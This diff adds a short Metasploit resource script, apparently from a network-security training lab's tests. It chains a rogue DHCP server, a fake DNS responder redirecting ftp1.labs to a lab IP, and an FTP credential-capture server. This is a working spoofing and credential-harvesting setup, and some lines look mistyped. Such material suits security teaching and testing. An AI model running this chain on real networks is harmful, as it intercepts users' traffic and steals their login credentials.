@@ -1,0 +1,16 @@
+
+spool /home/w4sp-lab/w4sp_lab2/tests/dns/tmp_spool
+use auxiliary/server/dhcp
+set NETMASK 255.255.255.0
+set DOMAINNAME 192.100.200.177
+set SET SRVHOST 192.100.200.177
+exploit -j -q
+
+use auxiliary/server/fakedns
+set TARGETACTION FAKE
+set TARGETDOMAIN ftp1.labs
+set TARGETHOST 192.100.200.177
+exploit -j -q
+
+use auxiliary/server/capture/ftp
+exploit
